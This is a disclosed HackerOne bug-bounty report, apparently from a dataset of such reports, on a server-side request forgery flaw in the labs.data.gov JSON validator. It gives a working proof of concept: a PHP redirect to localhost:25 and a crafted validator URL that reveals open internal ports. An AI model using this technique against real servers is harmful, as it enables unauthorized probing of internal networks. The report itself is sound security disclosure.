---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '272095'
original_report_id: '272095'
title: SSRF/XSPA in labs.data.gov/dashboard/validate
weakness: Server-Side Request Forgery (SSRF)
team_handle: gsa_bbp
created_at: '2017-09-26T16:40:23.115Z'
disclosed_at: '2020-05-05T20:18:01.922Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 40
asset_identifier: labs.data.gov
asset_type: URL
max_severity: critical
tags:
- hackerone
- server-side-request-forgery-ssrf
---

# SSRF/XSPA in labs.data.gov/dashboard/validate

## Metadata

- HackerOne Report ID: 272095
- Weakness: Server-Side Request Forgery (SSRF)
- Program: gsa_bbp
- Disclosed At: 2020-05-05T20:18:01.922Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi.

This vulnerability allows access to all ports locally. Which is not visible from the web.

1)We need an interim site file index.php
2)Next we write in index.php

`<?
header("Location: http://localhost:25");
?>`

3)Next go to https://labs.data.gov/dashboard/validate

And write url - for example http://example/index.php

If the port will be open (locally) that we will see the inscription

`Source http://example/index.php
Schema federal-v1.1
Valid JSON false
Errors 
The validator was unable to determine if this was valid JSON`
F224225

if not open

`Source http://example/index.php
Schema non-federal
Errors 
File not found or couldn't be downloaded`
F224224

final url for example
`https://labs.data.gov/dashboard/validate?schema=federal-v1.1&output=browser&datajson_url=http%3A%2F%2Fexample%2Findex.php&qa=true&as_sfid=your_sfid&as_fid=your_fid`


thank you ,haxta4ok00

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
